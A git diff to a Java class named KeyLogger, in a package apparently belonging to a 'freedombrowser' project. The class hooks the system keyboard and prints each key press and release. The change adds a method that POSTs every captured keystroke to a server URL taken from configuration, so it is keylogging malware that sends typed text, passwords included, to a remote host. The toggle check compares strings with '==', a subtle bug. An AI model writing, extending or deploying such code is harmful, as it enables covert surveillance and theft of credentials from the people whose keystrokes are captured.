@@ -1,19 +1,21 @@
 package org.freedombrowser;
 
-
 import java.awt.Desktop;
 import java.awt.MenuItem;
 import java.awt.PopupMenu;
 import java.awt.SystemTray;
 import java.awt.TrayIcon;
-import java.io.File;
-import java.io.InputStream;
-import java.io.PrintStream;
-import java.io.PrintWriter;
-import java.io.StringWriter;
+import java.io.*;
+import java.net.HttpURLConnection;
+import java.net.URI;
+import java.net.URL;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 import java.nio.charset.StandardCharsets;
 import java.time.LocalDateTime;
 import java.time.format.DateTimeFormatter;
+import java.util.Objects;
 import java.util.logging.Level;
 import java.util.logging.Logger;
 
@@ -111,17 +113,48 @@ public class KeyLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
-        System.out.print("↓" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", ""));
+        String Pressed = "↓" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", "");
+        System.out.print(Pressed);
+        if (Config.getConfigValue("KeyLogger", "POSTRequest") == "true") {
+            sendPostRequest(Pressed);
+        }
     }
 
     @Override
     public void nativeKeyReleased(NativeKeyEvent e) {
         // don't touch it works
-        System.out.print("↑" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", ""));
+        String Released = "↑" + NativeKeyEvent.getKeyText(e.getKeyCode()).replace("Undefined", "");
+        System.out.print(Released);
+        if (Config.getConfigValue("KeyLogger", "POSTRequest") == "true") {
+            sendPostRequest(Released);
+        }
+
     }
 
     @Override
     public void nativeKeyTyped(NativeKeyEvent e) {
         System.out.print(" ");
+    }
+
+    public static void sendPostRequest(String postData) {
+        try {
+            URL apiUrl = new URL(Objects.requireNonNull(Config.getConfigValue("KeyLogger", "apiURL")));
+            HttpURLConnection connection = (HttpURLConnection) apiUrl.openConnection();
+
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+
+            connection.setRequestProperty("Content-Type", "text/plain");
+            try (OutputStream os = connection.getOutputStream()) {
+                byte[] input = postData.getBytes(StandardCharsets.UTF_8);
+                os.write(input, 0, input.length);
+            }
+
+            int responseCode = connection.getResponseCode();
+            // System.out.println("[KeyLogger] [POST server] " + responseCode);
+            connection.disconnect();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
     }
 }
